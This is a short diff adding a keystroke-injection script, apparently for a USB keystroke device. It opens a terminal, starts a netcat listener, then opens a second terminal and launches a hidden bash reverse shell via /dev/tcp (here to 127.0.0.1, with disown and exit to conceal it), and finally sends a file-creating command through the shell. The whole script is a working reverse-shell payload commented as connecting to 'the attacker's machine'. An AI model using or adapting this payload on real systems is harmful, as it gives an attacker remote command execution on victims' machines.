@@ -1,0 +1,14 @@
+# open first terminal
+<c-a-t><DELAY 500>
+
+# listening to port 42069
+nc -lvp 42069<\enter>
+
+# open second terminal
+<c-a-t><DELAY 500>
+
+# connect to the attacker's machine
+bash -i >& /dev/tcp/127.0.0.1/42069 0>&1 & disown & exit<\enter>
+
+# go back to attacker's terminal and perform a simple command
+<DELAY 200>echo "create a new file" > __new_file.txt<\enter>
